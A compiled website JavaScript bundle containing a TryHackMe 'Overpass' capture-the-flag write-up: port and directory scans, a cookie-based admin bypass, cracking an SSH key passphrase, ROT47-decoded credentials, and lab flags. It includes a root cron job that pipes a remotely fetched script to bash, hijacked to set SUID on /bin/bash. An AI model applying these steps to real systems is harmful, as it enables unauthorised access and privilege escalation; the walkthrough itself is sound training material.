"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4822],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},c=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,s=e.originalType,p=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=l(n),m=a,h=u["".concat(p,".").concat(m)]||u[m]||d[m]||s;return n?r.createElement(h,o(o({ref:t},c),{},{components:n})):r.createElement(h,o({ref:t},c))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var s=n.length,o=new Array(s);o[0]=m;var i={};for(var p in t)hasOwnProperty.call(t,p)&&(i[p]=t[p]);i.originalType=e,i[u]="string"==typeof e?e:a,o[1]=i;for(var l=2;l<s;l++)o[l]=n[l];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},86173:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>p,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>l});var r=n(87462),a=(n(67294),n(3905));const s={},o="Overpass",i={unversionedId:"Tryhackme/Overpass/Overpass",id:"Tryhackme/Overpass/Overpass",title:"Overpass",description:"What happens when some broke CompSci students make a password manager?",source:"@site/writeups/Tryhackme/Overpass/Overpass.md",sourceDirName:"Tryhackme/Overpass",slug:"/Tryhackme/Overpass/",permalink:"/writeups/Tryhackme/Overpass/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"One Piece",permalink:"/writeups/Tryhackme/One Piece/"},next:{title:"Overpass 2 - Hacked",permalink:"/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2"}},p={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Overpass",id:"overpass-1",level:2}],c={toc:l},u="wrapper";function d(e){let{components:t,...s}=e;return(0,a.kt)(u,(0,r.Z)({},c,s,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"overpass"},"Overpass"),(0,a.kt)("p",null,"What happens when some broke CompSci students make a password manager?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/overpass"},"Overpass")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Cookie Manipulation"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (SSH)"),(0,a.kt)("li",{parentName:"ul"},"Cryptography",(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},"ROT47"))),(0,a.kt)("li",{parentName:"ul"},"Linux Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Exploiting Crontab"),(0,a.kt)("li",{parentName:"ul"},"Abusing SUID/GUID"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"overpass-1"},"Overpass"),(0,a.kt)("p",null,"What happens when a group of broke Computer Science students try to make a password manager?\nObviously a perfect commercial success!"),(0,a.kt)("p",null,"There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?"),(0,a.kt)("p",null,"UPDATE: The code is now claimed.\nThe machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Overpass$ sudo nmap -p- -sC -sV -Pn 10.10.134.43\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 17:16 CEST\nNmap scan report for 10.10.134.43\nHost is up (0.040s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)\n|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)\n|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Overpass\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 49.35 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Overpass$ gobuster dir -u http://10.10.134.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.134.43/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/05 17:18:08 Starting gobuster\n===============================================================\n/img (Status: 301)\n/downloads (Status: 301)\n/aboutus (Status: 301)\n/admin (Status: 301)\n/css (Status: 301)\n/http%3A%2F%2Fwww (Status: 301)\n/http%3A%2F%2Fyoutube (Status: 301)\n/http%3A%2F%2Fblogs (Status: 301)\n/http%3A%2F%2Fblog (Status: 301)\n/**http%3A%2F%2Fwww (Status: 301)\nProgress: 83630 / 220561 (37.92%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/05 17:22:48 Finished\n===============================================================\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.134.43/admin/"},"http://10.10.134.43/admin/")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"view-source:http://10.10.134.43/main.js"},"view-source:http://10.10.134.43/main.js")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"view-source:http://10.10.134.43/login.js"},"view-source:http://10.10.134.43/login.js"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'async function login() {\n  const usernameBox = document.querySelector("#username");\n  const passwordBox = document.querySelector("#password");\n  const loginStatus = document.querySelector("#loginStatus");\n  loginStatus.textContent = "";\n  const creds = { username: usernameBox.value, password: passwordBox.value };\n  const response = await postData("/api/login", creds);\n  const statusOrCookie = await response.text();\n  if (statusOrCookie === "Incorrect credentials") {\n    loginStatus.textContent = "Incorrect Credentials";\n    passwordBox.value = "";\n  } else {\n    Cookies.set("SessionToken", statusOrCookie);\n    window.location = "/admin";\n  }\n}\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"SessionToken")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(19281).Z,width:"1920",height:"261"})),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(56182).Z,width:"871",height:"739"})),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Since you keep forgetting your password, James, I've set up SSH keys for you.\n\nIf you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.\nAlso, we really need to talk about this \"Military Grade\" encryption. - Paradox\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"James")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337\n\nLNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN\nJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal\n73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT\nWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv\nBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ\nAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR\n3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf\nABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk\nVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR\nOkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P\n9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze\neaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ\n4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8\nGFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn\nexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy\nAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk\n6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58\ndPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i\nn0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT\n8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K\n4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z\nylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS\n49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2\n+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk\n2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7\n-----END RSA PRIVATE KEY-----\n\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Overpass$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\njames13          (id_rsa)\n1g 0:00:00:12 97.36% (ETA: 17:26:53) 0.08312g/s 1162Kp/s 1162Kc/s 1162KC/s 05981839..059815574\nSession aborted\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"james13")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Overpass$ chmod 600 id_rsa\nkali@kali:~/CTFs/tryhackme/Overpass$ ssh -i id_rsa james@10.10.134.43\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Hack the machine and get the flag in user.txt")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ ls\ntodo.txt  user.txt\njames@overpass-prod:~$ cat user.txt\nthm{65c1aaf000506e56996822c6281e6bf7}\njames@overpass-prod:~$\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{65c1aaf000506e56996822c6281e6bf7}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Escalate your privileges and get the flag in root.txt")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ cat todo.txt\nTo Do:\n> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough\n> Write down my password somewhere on a sticky note so that I don't forget it.\n  Wait, we make a password manager. Why don't I just use that?\n> Test Overpass for macOS, it builds fine but I'm not sure it actually works\n> Ask Paradox how he got the automated build script working and where the builds go.\n  They're not updating on the website\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-go"},'//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example\nfunc rot47(input string) string {\n    var result []string\n    for i := range input[:len(input)] {\n        j := int(input[i])\n        if (j >= 33) && (j <= 126) {\n            result = append(result, string(rune(33+((j+14)%94))))\n        } else {\n            result = append(result, string(input[i]))\n        }\n    }\n    return strings.Join(result, "")\n}\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-go"},'credsPath, err := homedir.Expand("~/.overpass")\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ cat .overpass\n,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://www.dcode.fr/rot-47-cipher"},"ROT-47 Cipher"))),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},'[{"name":"System","pass":"saydrawnlyingpicture"}]')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Overpass$ cp /usr/share/linpeas/linpeas.sh .\nkali@kali:~/CTFs/tryhackme/Overpass$ sudo python3 -m http.server 80\n[sudo] password for kali:\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.134.43 - - [05/Oct/2020 17:42:39] "GET /linpeas.sh HTTP/1.1" 200 -\n^C\nKeyboard interrupt received, exiting.\nkali@kali:~/CTFs/tryhackme/Overpass$\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ wget 10.8.106.222/linpeas.sh\n--2020-10-05 15:42:40--  http://10.8.106.222/linpeas.sh\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 289937 (283K) [text/x-sh]\nSaving to: \u2018linpeas.sh\u2019\n\nlinpeas.sh      100%[=====>] 283.14K  1.39MB/s    in 0.2s\n\n2020-10-05 15:42:40 (1.39 MB/s) - \u2018linpeas.sh\u2019 saved [289937/289937]\n\njames@overpass-prod:~$ ls\nlinpeas.sh  todo.txt  user.txt\njames@overpass-prod:~$ chmod +x linpeas.sh\njames@overpass-prod:~$ ./linpeas.sh\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n# Update builds from latest code\n* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Overpass$ mkdir -p www/downloads/src/\nkali@kali:~/CTFs/tryhackme/Overpass$ cd www/\nkali@kali:~/CTFs/tryhackme/Overpass/www$ echo -n 'chmod +s /bin/bash' > downloads/src/buildscript.sh\nkali@kali:~/CTFs/tryhackme/Overpass/www$ sudo python3 -m http.server 80\n[sudo] password for kali:\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ cat /etc/hosts\n127.0.0.1 localhost\n127.0.1.1 overpass-prod\n10.8.106.222 overpass.thm\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"james@overpass-prod:~$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash\njames@overpass-prod:~$ /bin/bash -p\nbash-4.4# ls\nlinpeas.log  linpeas.sh  todo.txt  user.txt\nbash-4.4# cd /root\nbash-4.4# ls\nbuildStatus  builds  go  root.txt  src\nbash-4.4# cat root.txt\nthm{7f336f8c359dbac18d54fdd64ea753bb}\nbash-4.4#\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{7f336f8c359dbac18d54fdd64ea753bb}")))}d.isMDXComponent=!0},19281:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-10-05_17-21-d165d246a5974603000f15692792dfd8.png"},56182:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-10-05_17-22-4bad361e530a87a104d2dcae2905a1ff.png"}}]);